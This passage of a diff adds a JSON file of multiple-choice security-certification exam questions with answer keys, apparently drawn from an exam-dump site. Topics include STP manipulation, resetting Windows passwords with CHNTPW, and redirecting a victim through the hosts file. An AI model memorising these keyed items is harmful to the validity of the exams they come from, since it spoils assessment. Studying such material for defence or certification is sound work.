+    "q": "What is correct about digital signatures?",
+    "choices": [
+      "A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party.",
+      "Digital signatures may be used in different documents of the same type.",
+      "A digital signature cannot be moved from one signed document to another because it is a plain hash of the document content.",
+      "Digital signatures are issued once for each user and can be used everywhere until they expire."
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 216,
+    "q": "An attacker with access to the inside network of a small company launches a successful STP manipulation attack.\nWhat will he do next?",
+    "choices": [
+      "He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer.",
+      "He will activate OSPF on the spoofed root bridge.",
+      "He will repeat this action so that it escalates to a DoS attack.",
+      "He will repeat the same attack against all L2 switches of the network."
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 217,
+    "q": "You have gained physical access to a Windows 2008 R2 server which has an accessible disc drive. When you attempt to boot the server and log in, you are unable to guess the password. In your toolkit, you have an Ubuntu 9.10 Linux LiveCD.\nWhich Linux-based tool can change any user’s password or activate disabled Windows accounts?",
+    "choices": [
+      "John the Ripper",
+      "SET",
+      "CHNTPW",
+      "Cain & Abel"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 218,
+    "q": "What does a firewall check to prevent particular ports and applications from getting packets into an organization?",
+    "choices": [
+      "Transport layer port numbers and application layer headers",
+      "Presentation layer headers and the session layer port numbers",
+      "Network layer headers and the session layer port numbers",
+      "Application layer port numbers and the transport layer headers"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 219,
+    "q": "An attacker has installed a RAT on a host. The attacker wants to ensure that when a user attempts to go to \"www.MyPersonalBank.com\", the user is directed to a phishing site.\nWhich file does the attacker need to modify?",
+    "choices": [
+      "Boot.ini",
+      "Sudoers",
+      "Networks",
+      "Hosts"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 220,
+    "q": "is a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks.",
+    "choices": [
+      "DNSSEC",
+      "Resource records",
+      "Resource transfer",
+      "Zone transfer"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 221,
+    "q": "Which of the following incident handling process phases is responsible for defining rules, collaborating human workforce, creating a back-up plan, and testing the plans for an organization?",
+    "choices": [
+      "Preparation phase",
+      "Containment phase",
+      "Identification phase",
+      "Recovery phase"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 222,
+    "q": "The configuration allows a wired or wireless network interface controller to pass all traffic it receives to the Central Processing Unit (CPU), rather than passing only the frames that the controller is intended to receive.\nWhich of the following is being described?",
+    "choices": [
+      "Multi-cast mode",
+      "Promiscuous mode",
+      "WEM",
+      "Port forwarding"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 223,
+    "q": "A large mobile telephony and data network operator has a data center that houses network elements. These are essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and IPS systems.\nWhat is the best security policy concerning this setup?",
+    "choices": [
+      "Network elements must be hardened with user ids and strong passwords. Regular security tests and audits should be performed.",
+      "As long as the physical access to the network elements is restricted, there is no need for additional measures.",
+      "There is no need for specific security measures on the network elements as long as firewalls and IPS systems exist.",
+      "The operator knows that attacks and down time are inevitable and should have a backup site."
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  },
+  {
+    "id": 224,
+    "q": "PGP, SSL, and IKE are all examples of which type of cryptography?",
+    "choices": [
+      "Digest",
+      "Secret Key",
+      "Public Key",
+      "Hash Algorithm"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "dumpsbase"
+  }
+]
